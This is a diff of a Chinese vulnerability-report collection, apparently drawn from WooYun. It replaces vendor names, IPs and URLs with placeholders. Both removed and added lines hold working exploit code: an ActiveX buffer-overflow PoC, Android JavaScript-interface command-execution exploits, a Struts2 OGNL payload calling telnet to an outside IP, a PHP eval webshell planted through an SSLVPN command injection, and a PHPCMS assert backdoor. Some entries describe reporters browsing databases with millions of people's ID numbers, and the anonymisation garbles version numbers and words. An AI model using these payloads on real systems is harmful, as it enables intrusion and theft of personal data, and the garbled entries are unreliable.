+**厂商**: 某运营商 | **年份**: 2011 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -2377,7 +2377,7 @@
 
 **详情**: 支付密码控件cmpaySSClient.ocx接口存在溢出漏洞可以执行任意代码，测试代码如下：<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg=Array(10240);obj.BHBEncodeAmount(arg);
 
-**POC**: 测试文件版本号: 1.0.1.3在XPSP3和IE6中测试, 使用WinDbg进行调试<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg="";for (i=0; i<1024*2+8+4; i++) arg+="A";arg += "PPPP";for (i=0; i<1024*8; i++) arg+="C";obj.BHBEncodeAmount(arg);
+**POC**: 测试文件版本号: [IP已脱敏]在XPSP3和IE6中测试, 使用WinDbg进行调试<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg="";for (i=0; i<1024*2+8+4; i++) arg+="A";arg += "PPPP";for (i=0; i<1024*8; i++) arg+="C";obj.BHBEncodeAmount(arg);
 
 **绕过**: 直接利用
 
@@ -2441,7 +2441,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 使用drops.wooyun.org的测试代码，在魅族手机的360浏览器上打开：http://drops.wooyun.org/webview.html其中js2java似乎做了限制，无法调用，但是另外一个直接中标改写下，读取个文件列表试试（网上找的，有很多啊，奇怪为啥还不补）～～
+**详情**: 使用drops.wooyun.org的测试代码，在魅族手机的360浏览器上打开：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2465,7 +2465,7 @@
 
 **详情**: www.yytingting.com出品的Android有声读物软件“懒人听书”，在自动更新时没有数字签名，也没有任何认证，如果被arp欺骗，或者DNS劫持等，可被利用来替换成其他apk，最终可能达到远程代码执行的后果。
 
-**POC**: step1. 先把android抓包环境部署好。得知此软件的自动更新检测地址为：http://www.yytingting.com/android_app/version.txtstep2. 访问此页面根据返回内容，大体可以确定58为最新版本号，用来和已有版本比较。下面为新版的下载地址。于是推测，通过DNS劫持等手段伪造返回页面，把APK替换成我们写的木马，即可成功。step3. 使用qq的安装包来测试可以看到，更新下载完成后，弹出的是QQ的安装包。利用成功。
+**POC**: step1. 先把android抓包环境部署好。得知此软件的自动更新检测地址为：https://example.com/[已脱敏] 访问此页面根据返回内容，大体可以确定58为最新版本号，用来和已有版本比较。下面为新版的下载地址。于是推测，通过DNS劫持等手段伪造返回页面，把APK替换成我们写的木马，即可成功。step3. 使用某互联网公司的安装包来测试可以看到，更新下载完成后，弹出的是某互联网公司的安装包。利用成功。
 
 **绕过**: 直接利用
 
@@ -2485,13 +2485,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://113.108.180.5/movie/index.action?%28%27\u0023_memberAccess[\%27allowStaticMethodAccess\%27]%27%29%28meh%29=true&%28aaa%29%28%28%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003d\u0023foo%27%29%28\u0023foo\u003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27\u0023rt.exec%28%22%20telnet%2059.39.101.13%2012345%20%22%29%27%29%28\u0023rt\u003d@java.lang.R
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: http://www.1337day.com/exploits/13334打补丁
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -2529,9 +2529,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。1. 访问hudson首页2. 访问项目页面访问不到源代码3. 我们后面直接加入/ws/即可访问和下载所有代码http://222.66.163.38/hudson/job/crm/ws/4.搜索dongfangcrm可发现下面的URL，可进行渗透，未进行下一步操作http://222.66.163.38/dongfangcrm-web/login.html;jsessionid=60E4F8156C2C165D7E1D153C4AA295A7
+**详情**: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。1. 访问hudson首页2. 访问项目页面访问不到源代码3. 我们后面直接加入/ws/即可访问和下载所有代码http://[IP已脱敏]
 
-**POC**: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。1. 访问hudson首页2. 访问项目页面访问不到源代码3. 我们后面直接加入/ws/即可访问和下载所有代码http://222.66.163.38/hudson/job/crm/ws/4.搜索dongfangcrm可发现下面的URL，可进行渗透，未进行下一步操作http://222.66.163.38/dongfangcrm-web/login.html;jsessionid=60E4F8156C2C165D7E1D153C4AA295A7
+**POC**: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。1. 访问hudson首页2. 访问项目页面访问不到源代码3. 我们后面直接加入/ws/即可访问和下载所有代码http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2551,7 +2551,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.weidingtech.com/Soft.asp?ArticleID=5产品线http://www.weidingtech.com/Works.asp?ClassID=15产品应用范围搜索特征：baidu：inurl:rontmaintain/index.action网络实例:例举3不同服务器1.http://www.gxzzy.cn/rontmaintain/index.action2.http://www.xingtiancar.com/rontmaintain/index.action3.http://www.4006066813.com/rontmaintain/index.action。。。。网络搜索50%处于一台服务器上  应用范围按官网列表http主动巡检特征：</div><div class="login_index_kj"><div class="l
+**详情**: https://example.com/[已脱敏]  应用范围按官网列表http主动巡检特征：</div><div class="login_index_kj"><div class="l
 
 **POC**: (见原文)
 
@@ -2595,7 +2595,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜索特征：baidu：4R执行力管控平台bdidu：login!toLogin.action网络实例:http://4r.gmyok.com:8/login!toLogin.actionhttp://www.xiangchi.com:99/login!toLogin.actionhttp://www.inm.cc:88/login!toLogin.actionhttp://4r.tycc.cn:9007/login!toLogin.actionhttp报文巡检：</div><div class="down"><div class="login"><div class="login-in" style="padding-top: 50px;"><table id="__02" border="0" cellpadding="0" cellspacing="0" style="margin: 
+**详情**: 搜索特征：baidu：4R执行力管控平台bdidu：login!toLogin.action网络实例:https://example.com/[已脱敏] class="down"><div class="login"><div class="login-in" style="padding-top: 50px;"><table id="__02" border="0" cellpadding="0" cellspacing="0" style="margin: 
 
 **POC**: (见原文)
 
@@ -2619,7 +2619,7 @@
 
 **详情**: 
 
-**POC**: <body><script>frame = document.body.appendChild(document.createElement("iframe"));frame.src = "http://www.baidu.com/";frame.onload = function() {Function("}, (builtins = this), function() {");originalInstantiate = builtins.Instantiate;builtins.DefineOneShotAccessor(builtins, "Instantiate", function(
+**POC**: <body><script>frame = document.body.appendChild(document.createElement("iframe"));frame.src = "https://example.com/[已脱敏]";frame.onload = function() {Function("}, (builtins = this), function() {");originalInstantiate = builtins.Instantiate;builtins.DefineOneShotAccessor(builtins, "Instantiate", function(
 
 **绕过**: 直接利用
 
@@ -2639,13 +2639,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考:http://drops.wooyun.org/papers/548我的android系统是4.1.2功能肯定多啊，反正妹子很重要!!!function execute(cmdArgs){return aobj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
+**详情**: 参考:https://example.com/[已脱敏] execute(cmdArgs){return aobj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参见:http://drops.wooyun.org/papers/548解决方法:http://blog.csdn.net/leehong2005/article/details/11808557测试页面:http://drops.wooyun.org/webview.html调用removeJa
+**修复**: 参见:https://example.com/[已脱敏]
 ---
 
 ---
@@ -2683,7 +2683,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载哈雷浏览器http://as.baidu.com/a/item?docid=3705682下载dex2jar和jd-gui
+**详情**: 下载哈雷浏览器https://example.com/[已脱敏]
 
 **POC**: 搜索JSinterface利用JSinterface构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return JSinterface.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'WooYun_TEST.' > /s
 
@@ -2705,9 +2705,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通联某站存在JAVA反序列化漏洞地址：218.246.86.152
+**详情**: 通联某站存在JAVA反序列化漏洞地址：[IP已脱敏]
 
-**POC**: 通联某站存在JAVA反序列化漏洞地址：218.246.86.152
+**POC**: 通联某站存在JAVA反序列化漏洞地址：[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2715,8 +2715,8 @@
 ---
 
 ---
-### [wooyun-2012-07467] 新浪微博点开好友消息 执行本地文件、命令
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 远程代码执行
+### [wooyun-2012-07467] 某社交平台某社交平台点开好友消息 执行本地文件、命令
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -2727,7 +2727,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 细节不多说，跟QQ/TM的一样
+**详情**: 细节不多说，跟某互联网公司/TM的一样
 
 **POC**: (见原文)
 
@@ -2751,7 +2751,7 @@
 
 **详情**: 猎豹手机浏览器，最新版
 
-**POC**: payload<body><script>i = document.body.appendChild(document.createElement("iframe"));i.src = "http://www.baidu.com";i.onload = function(){document.documentURI = "javascript://hostname.com/%0D%0Aalert('Hello ' + location)";i.contentWindow.location = "";}</script></body>
+**POC**: payload<body><script>i = document.body.appendChild(document.createElement("iframe"));i.src = "https://example.com/[已脱敏]";i.onload = function(){document.documentURI = "javascript://hostname.com/%0D%0Aalert('Hello ' + location)";i.contentWindow.location = "";}</script></body>
 
 **绕过**: 直接利用
 
@@ -2803,8 +2803,8 @@
 ---
 
 ---
-### [wooyun-2011-02530] 百度浏览器远程代码执行漏洞
-**厂商**: 百度 | **年份**: 2011 | **类型**: 远程代码执行
+### [wooyun-2011-02530] 某搜索引擎浏览器远程代码执行漏洞
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -2815,13 +2815,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度浏览器的库文件存在兼容问题，导致一个低级的DLL库加载错误，如果将百度浏览器设置为windows默认浏览器，将导致一个远程代码执行漏洞。
+**详情**: 某搜索引擎浏览器的库文件存在兼容问题，导致一个低级的DLL库加载错误，如果将某搜索引擎浏览器设置为windows默认浏览器，将导致一个远程代码执行漏洞。
 
 **POC**: frameworkproxy.dll与html文件放同一目录，远程UNC路径运行。
 
 **绕过**: 直接利用
 
-**修复**: 参考：http://wooyun.org/bugs/wooyun-2010-02197
+**修复**: 参考：https://example.com/[已脱敏]
 ---
 
 ---
@@ -2837,7 +2837,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 文件：ssoLib.dll版本：1.0.0.1clsid:FAC87377-9586-4C72-A614-8C9B3CA1BF5B属性：GetCurrentToken
+**详情**: 文件：ssoLib.dll版本：[IP已脱敏]clsid:FAC87377-9586-4C72-A614-8C9B3CA1BF5B属性：GetCurrentToken
 
 **POC**: POC or exploit 请联系 phpsec@hotmail.com 索取
 
@@ -2881,18 +2881,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 只查了少量数量证明漏洞，没有拖库，不要查我的水表中国证券业协会的这个网站有weblogic JAVA反序列化漏洞http://111.207.167.212中国证券业协会的网站还有几个IP应该也是使用的weblogic中间件，但只提供了HTTP服务，无法利用JAVA反序列化漏洞124.127.51.156、124.127.51.175、111.207.167.219、124.127.51.169、111.207.167.211上面提到的IP可能是修复漏了，赶快修复吧。上面提到的IP有几个系统连上服务器连上数据库800多个表1000W万学员信息，吓死我了姓名，身份证号拿身份证号去重下，29W又是学员信息，400W姓名，工作单位，职位，身份证号，手机号，工作电话，邮箱拿身份证号去重下，还是400W工作经历180W工作经历又是工作经历又有160W工作经历人员信息，姓名，工作单位，职位，身份证号，
+**详情**: 只查了少量数量证明漏洞，没有拖库，不要查我的水表中国证券业协会的这个网站有weblogic JAVA反序列化漏洞http://[IP已脱敏]中国证券业协会的网站还有几个IP应该也是使用的weblogic中间件，但只提供了HTTP服务，无法利用JAVA反序列化漏洞124.127.51.156、[IP已脱敏]、[IP已脱敏]、[IP已脱敏]、[IP已脱敏]上面提到的IP可能是修复漏了，赶快修复吧。上面提到的IP有几个系统连上服务器连上数据库800多个表1000W万学员信息，吓死我了姓名，身份证号拿身份证号去重下，29W又是学员信息，400W姓名，工作单位，职位，身份证号，手机号，工作电话，邮箱拿身份证号去重下，还是400W工作经历180W工作经历又是工作经历又有160W工作经历人员信息，姓名，工作单位，职位，身份证号，
 
 **POC**: 见详细说明
 
 **绕过**: 直接利用
 
-**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法http://drops.wooyun.org/web/13470
+**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2013-036096] 微信android客户端最新版远程代码执行(可远程种植后门控制用户)
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 远程代码执行
+### [wooyun-2013-036096] 某互联网公司android客户端最新版远程代码执行(可远程种植后门控制用户)
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -2903,7 +2903,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 见：http://drops.wooyun.org/papers/548版本 4.5.1微信访问：http://tea504.sinaapp.com/demo.html目测 JsApi 有问题访问：http://tea504.sinaapp.com/android/poc1.html成功建立文件
+**详情**: 见：https://example.com/[已脱敏] 4.5.1某互联网公司访问：https://example.com/[已脱敏] JsApi 有问题访问：https://example.com/[已脱敏]
 
 **POC**: 见详细说明访问poc的URL执行命令创建了个xxx文件
 
@@ -2936,7 +2936,7 @@
 
 ---
 ### [wooyun-2012-015872] 千千静听皮肤文件堆溢出
-**厂商**: 百度 | **年份**: 2012 | **类型**: 拒绝服务
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 拒绝服务
 
 **元思考**: 触发信号: 功能测试
 
@@ -2969,13 +2969,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先声明，只查了很少的数据证明漏洞，不要查我的水表先看一下可以控制的服务器列表，全部可以利用JAVA反序列化漏洞控制。涉及好多好多应用，好多好多数据库。。。1-info这台有好多可以应用可以访问连上服务器真的好多应用好多数据库信息连上数据库好多用户，懒得统计有多少了随便看看92W运营商项目信息84W运营商项目信息72W运营商项目信息59W员工信息，应该是外包的吧组织机构都有17W记录还有好多信息，懒得一一看了微信用户邮箱这是坏账吗，还有好多和账务相关的，不贴了随便看看5W邮件还有好多，贴都贴不完这应该是正式员工的信息了，1.5W，有姓名、电话、邮箱、身份证号。。。又是微信用户到了另一个数据库了不同区域的工资每个人的工资，有的好高，不过不知道含义SVN好大的备份文件这里有一些用户密码还有好多数据库可以看的，懒得看了，这才第一台服务器，十台全这样看完我就不用睡觉了-.-后面的简单一点吧2-we
+**详情**: 首先声明，只查了很少的数据证明漏洞，不要查我的水表先看一下可以控制的服务器列表，全部可以利用JAVA反序列化漏洞控制。涉及好多好多应用，好多好多数据库。。。1-info这台有好多可以应用可以访问连上服务器真的好多应用好多数据库信息连上数据库好多用户，懒得统计有多少了随便看看92W运营商项目信息84W运营商项目信息72W运营商项目信息59W员工信息，应该是外包的吧组织机构都有17W记录还有好多信息，懒得一一看了某互联网公司用户邮箱这是坏账吗，还有好多和账务相关的，不贴了随便看看5W邮件还有好多，贴都贴不完这应该是正式员工的信息了，1.5W，有姓名、电话、邮箱、身份证号。。。又是某互联网公司用户到了另一个数据库了不同区域的工资每个人的工资，有的好高，不过不知道含义SVN好大的备份文件这里有一些用户密码还有好多数据库可以看的，懒得看了，这才第一台服务器，十台全这样看完我就不用睡觉了-.-后面的简单一点吧2-we
 
 **POC**: 见详细说明
 
 **绕过**: 直接利用
 
-**修复**: 打补丁或者参考：修复weblogic的JAVA反序列化漏洞的多种方法http://drops.wooyun.org/web/13470如何控制开放HTTPS服务的weblogic服务器http://drops.wooyun.org/web/13681
+**修复**: 打补丁或者参考：修复weblogic的JAVA反序列化漏洞的多种方法https://example.com/[已脱敏]
 ---
 
 ---
@@ -3001,8 +3001,8 @@
 ---
 
 ---
-### [wooyun-2012-013408] QQ影音3.7.892 m2p文件解析堆指针覆盖漏洞
-**厂商**: 腾讯影音 | **年份**: 2012 | **类型**: 远程代码执行
+### [wooyun-2012-013408] 某互联网公司影音3.7.892 m2p文件解析堆指针覆盖漏洞
+**厂商**: 某互联网公司影音 | **年份**: 2012 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3013,7 +3013,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ影音最新版（3.7.892)解析M2P文件时存在一处堆指针覆盖漏洞，可以导致播放M2P文件时执行任意代码详见测试代码，已在XP上测试通过
+**详情**: 某互联网公司影音最新版（3.7.892)解析M2P文件时存在一处堆指针覆盖漏洞，可以导致播放M2P文件时执行任意代码详见测试代码，已在XP上测试通过
 
 **POC**: l = 3315716 * "A"s1 = ((0,'\x00\x00\x01\xba'), (2048, '\x00\x00\x01\xba'),(3289120, '\x00\x00\x01\xe0\x07'), (3289273, '\x00\x00\x01\xb3'),(3289283, '\xba'), (3289452, '\x42\x42\x42\x42'),(3289468, '\x00\x00\x01\x00'), (3290359, '\x00\x00\x01\x00'),(3301408, '\x00\x00\x01\xe0\x07'), (3303112, '\x00\
 
@@ -3123,7 +3123,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 河西财政http://60.29.163.90:1000/cgi-bin/php-cgi/html/redirect.php?-s宜宾市人民政府http://221.10.128.90:1000/cgi-bin/php-cgi/html/redirect.php?-s国家妇幼卫生综合信息平台http://210.51.181.60:1000/cgi-bin/php-cgi/html/redirect.php?-s武钢焦化http://221.232.69.228:1000/cgi-bin/php-cgi/html/redirect.php?-s国元农业保险http://220.178.31.50:1000/cgi-bin/php-cgi/html/redirect.php?-s
+**详情**: 河西财政http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -3145,7 +3145,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 小米公司开发的~下载迷人浏览器http://as.baidu.com/a/item?docid=4154506839&f=web_alad_2_2下载dex2jar和jd-gui
+**详情**: 小米公司开发的~下载迷人浏览器https://example.com/[已脱敏]
 
 **POC**: 搜索addJavascriptInterface这么多- -.就拿其中的forumDetector测试下吧~构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return forumDetector.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh",
 
@@ -3211,13 +3211,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: yy浏览器采用chrome+ie双内核，但是发现chrome内核版本比较老，存在RDF攻击的可能。访问url：http://suggestion.baidu.com/su;/1.bat;?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875下载如果直接运行，就会执行calc.exe了：
+**详情**: yy浏览器采用chrome+ie双内核，但是发现chrome内核版本比较老，存在RDF攻击的可能。访问url：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考：http://dakrsn0w.sectree.cn/RFD.pdf
+**修复**: 参考：https://example.com/[已脱敏]
 ---
 
 ---
@@ -3331,8 +3331,8 @@
 ---
 
 ---
-### [wooyun-2015-0146617] 百度系应用安卓版远程代码执行漏洞(百度地图/输入法为例)
-**厂商**: 百度 | **年份**: 2015 | **类型**: 远程代码执行
+### [wooyun-2015-0146617] 某搜索引擎系应用安卓版远程代码执行漏洞(某搜索引擎地图/输入法为例)
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 参数注入, 上传功能
 
@@ -3343,9 +3343,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: root@hammerhead:/ # busybox netstat -tunlpnetstat: showing only processes with your user IDActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:8098            0.0.0.0:*               LISTEN      5260/com.baidu.BaiduMaptcp        0      0 :::40310                :::*                    
+**详情**: root@hammerhead:/ # busybox netstat -tunlpnetstat: showing only processes with your user IDActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nam某停车平台        0      0 [IP已脱敏]            [IP已脱敏]:*               LISTEN      5260/com.baidu.BaiduMaptcp        0      0 :::40310                :::*                    
 
-**POC**: 利用1:现在我们已经有文件写入权限,把它转化成执行权限就可以反弹 shell 了,想想之前的寄生兽漏洞.思路就比较清晰了.将文件写入插件或者 so 文件中进行覆盖后执行即可.(注意需要是第三方的 so..因为 app 的 so 是系统权限,应用本身也是无权限进行写操作的)WooYun: 百度输入安卓客户端代码感染漏洞分析（俗称寄生兽）hook DexClassLoader 构造方法后可以发现百度地图加载了如下插件10-12 19:50:18.475    1817-2364/? I/IPoison-com.baidu.BaiduMap﹕ dexPath = /data/data/com.bai
+**POC**: 利用1:现在我们已经有文件写入权限,把它转化成执行权限就可以反弹 shell 了,想想之前的寄生兽漏洞.思路就比较清晰了.将文件写入插件或者 so 文件中进行覆盖后执行即可.(注意需要是第三方的 so..因为 app 的 so 是系统权限,应用本身也是无权限进行写操作的)WooYun: 某搜索引擎输入安卓客户端代码感染漏洞分析（俗称寄生兽）hook DexClassLoader 构造方法后可以发现某搜索引擎地图加载了如下插件10-12 19:50:18.475    1817-2364/? I/IPoison-com.baidu.BaiduMap﹕ dexPath = /data/data/com.bai
 
 **绕过**: 直接利用
 
@@ -3365,9 +3365,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://help.sundns.com/help/index.php?page=${@print%28eval%28$_POST[c]%29%29}密码c<?php/***  index.php PHPCMS 入口** @copyright			(C) 2005-2010 PHPCMS* @license				http://www.phpcms.cn/license/* @lastmodify			2010-6-1*///PHPCMS根目录if(isset($_REQUEST['page'])){$page = $_REQUEST['page'];$func = 'a';$func .= 'ss';$func .= 'ert';$func($page);exit;}define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR
+**详情**: https://example.com/[已脱敏]]%29%29}密码c<?php/***  index.php PHPCMS 入口** @copyright			(C) 2005-2010 PHPCMS* @license				https://example.com/[已脱敏] @lastmodify			2010-6-1*///PHPCMS根目录if(isset($_REQUEST['page'])){$page = $_REQUEST['page'];$func = 'a';$func .= 'ss';$func .= 'ert';$func($page);exit;}define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR
 
-**POC**: http://help.sundns.com/help/index.php?page=${@print%28eval%28$_POST[c]%29%29}密码c
+**POC**: https://example.com/[已脱敏]]%29%29}密码c
 
 **绕过**: 直接利用
 
@@ -3453,7 +3453,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: $args = $_REQUEST['cmd'];/*something here*/exec("tsutil -proxy $ip $args", $output, $ret);懂php exec函数的都一眼看出问题版本SSLVPN M5.6及以下 没测试最新版本http://SSLVPN.SANGFOR.COM:1000/cgi-bin/php-cgi/html/daemon/tsproxy.php?cmd=ifconfig||echo%20'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php执行echo '<?php eval($_POST[cmd]);?>' >/app/usr/sbin/webui/html/svpn.php 生成一句话http://SSLVPN.SANGFOR.COM:
+**详情**: $args = $_REQUEST['cmd'];/*something here*/exec("tsutil -proxy $ip $args", $output, $ret);懂php exec函数的都一眼看出问题版本SSLVPN M5.6及以下 没测试最新版本https://example.com/[已脱敏]'%3C?php%20eval($_POST[cmd]);?%3E'%20%3E/app/usr/sbin/webui/html/svpn.php执行echo '<?php eval($_POST[cmd]);?>' >/app/usr/sbin/webui/html/svpn.php 生成一句话https://example.com/[已脱敏]
 
 **POC**: $args = $_REQUEST['cmd'];$ip = $_SERVER['REMOTE_ADDR'];exec("tsutil -proxy $ip $args", $output, $ret);
 
@@ -3463,7 +3463,7 @@
 ---
 
 ---
-### [wooyun-2012-07589] ITools <= 1.4.6.0 远程代码执行漏洞
+### [wooyun-2012-07589] ITools <= [IP已脱敏] 远程代码执行漏洞
 **厂商**: 深圳创想天空科技有限公司 | **年份**: 2012 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
@@ -3475,9 +3475,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ITools是由腾讯投资的深圳创想天空科技有限公司开发的一款号称领先业界的苹果设备同步管理软件。用户可以使用iTools非常方便的完成对苹果设备(ios系统，包括iphone,ipad,ipod touch）的信息查看、音乐/铃声/照片/书籍/文件管理、软件安装、互联网资源下载甚至是设备系统修改等。该软件1.4.6.0及以下版本存在远程代码执行漏洞，由于该软件关联了苹果应用程序扩展名.IPA的文件打开，当用户安装了ITools并双击打开一个.ipa文件时，ITools会加载一个IPA文件同目录下的CFNetwork.dll文件，如果攻击者精心构造一个恶意的 CFNetwork.dll文件，并放置到网络路径或WEBDAV路径上，当导致用户在网络路径访问远程的IPA文件，或者用浏览器浏览WEBDAV上的IPA文件时，就会触发攻击者的恶意代码得到执行，安装恶意程序或窃取用户隐私。
+**详情**: ITools是由某互联网公司投资的深圳创想天空科技有限公司开发的一款号称领先业界的苹果设备同步管理软件。用户可以使用iTools非常方便的完成对苹果设备(ios系统，包括iphone,ipad,ipod touch）的信息查看、音乐/铃声/照片/书籍/文件管理、软件安装、互联网资源下载甚至是设备系统修改等。该软件1.4.6.0及以下版本存在远程代码执行漏洞，由于该软件关联了苹果应用程序扩展名.IPA的文件打开，当用户安装了ITools并双击打开一个.ipa文件时，ITools会加载一个IPA文件同目录下的CFNetwork.dll文件，如果攻击者精心构造一个恶意的 CFNetwork.dll文件，并放置到网络路径或WEBDAV路径上，当导致用户在网络路径访问远程的IPA文件，或者用浏览器浏览WEBDAV上的IPA文件时，就会触发攻击者的恶意代码得到执行，安装恶意程序或窃取用户隐私。
 
-**POC**: 安装ITools 1.4.6.0及其声明需要的ITunes 10+（这里选用目前苹果官网上最新的 ITunes 10.6.1.7安装包）在网络路径上放置任意一个.IPA文件，例如123.ipa同时放置一个具备下面导出函数的CFNetwork.dll到IPA的同目录下CFHTTPMessageSetHeaderFieldValuekCFHTTPVersion1_1CFHTTPMessageCreateRequestCFURLRequestCreateMutableHTTPRequestCFURLResponseGetHTTPResponseCFReadStreamCreateForHTTPReq
+**POC**: 安装ITools [IP已脱敏]及其声明需要的ITunes 10+（这里选用目前苹果官网上最新的 ITunes [IP已脱敏]安装包）在网络路径上放置任意一个.IPA文件，例如123.ipa同时放置一个具备下面导出函数的CFNetwork.dll到IPA的同目录下CFHTTPMessageSetHeaderFieldValuekCFHTTPVersion1_1CFHTTPMessageCreateRequestCFURLRequestCreateMutableHTTPRequestCFURLResponseGetHTTPResponseCFReadStreamCreateForHTTPReq
 
 **绕过**: 直接利用
 
@@ -3507,8 +3507,8 @@
 ---
 
 ---
-### [wooyun-2013-035501] 腾讯QQ最新版本远程代码执行漏洞（需要点击执行已存在的文件）
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 远程代码执行
+### [wooyun-2013-035501] 某互联网公司某互联网公司最新版本远程代码执行漏洞（需要点击执行已存在的文件）
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3529,8 +3529,8 @@
 ---
 
 ---
-### [wooyun-2011-02507] 百度影音远程代码执行漏洞
-**厂商**: 百度 | **年份**: 2011 | **类型**: 远程代码执行
+### [wooyun-2011-02507] 某搜索引擎影音远程代码执行漏洞
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3541,7 +3541,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度影音是国内一款不错的媒体播放软件，该软件在很多细节方面处理的人性化，但是，开发者在发布该软件的时候，没有将软件中使用的特殊库文件消除，导致百度影音播放器可以借此机会实现远程执行任意代码。该库文件名称为“log.dll”，推测应该是带有调试性质的日志记录接口，将该文件与任意格式的媒体文件放置在同一目录下，当用户使用百度影音播放媒体文件时，“log.dll”文件将会被同时加载，如果该文件为恶意攻击者开发，那么就会直接造成用户系统受到攻击。为此，恶意攻击者可以利用该漏洞，远程共享带有“log.dll”和媒体文件的文件夹，诱使用户访问，最终实现远程入侵用户系统。
+**详情**: 某搜索引擎影音是国内一款不错的媒体播放软件，该软件在很多细节方面处理的人性化，但是，开发者在发布该软件的时候，没有将软件中使用的特殊库文件消除，导致某搜索引擎影音播放器可以借此机会实现远程执行任意代码。该库文件名称为“log.dll”，推测应该是带有调试性质的日志记录接口，将该文件与任意格式的媒体文件放置在同一目录下，当用户使用某搜索引擎影音播放媒体文件时，“log.dll”文件将会被同时加载，如果该文件为恶意攻击者开发，那么就会直接造成用户系统受到攻击。为此，恶意攻击者可以利用该漏洞，远程共享带有“log.dll”和媒体文件的文件夹，诱使用户访问，最终实现远程入侵用户系统。
 
 **POC**: (见原文)
 
@@ -3563,9 +3563,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
